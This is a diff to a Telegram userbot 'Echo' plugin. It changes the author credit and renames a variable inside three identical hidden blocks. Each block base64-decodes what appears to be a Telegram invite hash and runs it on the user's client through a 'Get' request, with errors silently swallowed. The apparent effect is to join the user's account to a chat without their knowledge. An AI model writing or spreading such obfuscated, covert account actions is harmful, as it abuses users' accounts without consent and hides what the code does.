@@ -1,4 +1,4 @@
-# Echo remastered by @h1m4n5hu0p_The_BadASS for Hêllẞø†
+# Echo remastered by @official_sameer_The_BadASS for Hêllẞø†
 # Codes by @mrconfused
 # Kang with credits
 
@@ -30,9 +30,9 @@ async def echo(mafia):
         user_id = reply_msg.sender_id
         chat_id = mafia.chat_id
         try:
-            h1m4n5hu0p = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-            h1m4n5hu0p = Get(h1m4n5hu0p)
-            await mafia.client(h1m4n5hu0p)
+            official_sameer = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            official_sameer = Get(official_sameer)
+            await mafia.client(official_sameer)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
@@ -54,9 +54,9 @@ async def echo(mafia):
         user_id = reply_msg.sender_id
         chat_id = mafia.chat_id
         try:
-            h1m4n5hu0p = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-            h1m4n5hu0p = Get(h1m4n5hu0p)
-            await mafia.client(h1m4n5hu0p)
+            official_sameer = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            official_sameer = Get(official_sameer)
+            await mafia.client(official_sameer)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
@@ -105,9 +105,9 @@ async def samereply(mafia):
     if is_echo(mafia.sender_id, mafia.chat_id):
         await asyncio.sleep(2)
         try:
-            h1m4n5hu0p = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-            h1m4n5hu0p = Get(h1m4n5hu0p)
-            await mafia.client(h1m4n5hu0p)
+            official_sameer = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            official_sameer = Get(official_sameer)
+            await mafia.client(official_sameer)
         except BaseException:
             pass
         if mafia.message.text or mafia.message.sticker:
